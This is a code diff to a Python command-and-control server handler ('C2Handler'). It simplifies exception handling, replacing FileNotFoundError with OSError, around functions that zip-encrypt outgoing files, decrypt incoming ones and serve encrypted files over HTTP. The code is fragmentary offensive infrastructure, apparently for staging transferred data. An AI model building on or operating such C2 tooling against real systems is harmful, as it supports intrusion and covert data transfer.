@@ -111,12 +111,12 @@ class C2Handler(BaseHTTPRequestHandler):
                         try:
                             filename = cmd.split()[2]
                             if not path.isfile(f"{OUTGOING}/{filename}"):
-                                raise FileNotFoundError
+                                raise OSError
                             with AESZipFile(f"{OUTGOING}/{filename}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                                 zip_file.setpassword(ZIP_PASSWORD)
                                 zip_file.write(f"{OUTGOING}/{filename}", filename)
                                 print(f"{OUTGOING}/{filename} is now zip-encrypted.\n")
-                        except (FileNotFoundError, OSError):
+                        except OSError:
                             print(f"Unable to access {OUTGOING}/{filename}.\n")
                         except IndexError:
                             print(f"You must enter the filename located in {OUTGOING} to zip.\n")
@@ -128,7 +128,7 @@ class C2Handler(BaseHTTPRequestHandler):
                                 zip_file.setpassword(ZIP_PASSWORD)
                                 zip_file.extractall(INCOMING)
                                 print(f"{INCOMING}/{filename} is now unzipped and decrypted.\n")
-                        except (FileNotFoundError, OSError):
+                        except OSError:
                             print(f"{filename} was not found in {INCOMING}.\n")
                         except IndexError:
                             print(f"You must enter the filename located in {INCOMING} to unzip.\n")
@@ -159,7 +159,7 @@ class C2Handler(BaseHTTPRequestHandler):
                 with open(f"{filepath}", "rb") as file_handle:
                     self.http_response(HTTPStatusCode.OK.value)
                     self.wfile.write(cipher.encrypt(file_handle.read()))
-            except (FileNotFoundError, OSError):
+            except OSError:
                 print(f"{filepath} was not found on the c2 server.")
                 self.http_response(HTTPStatusCode.NOT_FOUND)
 
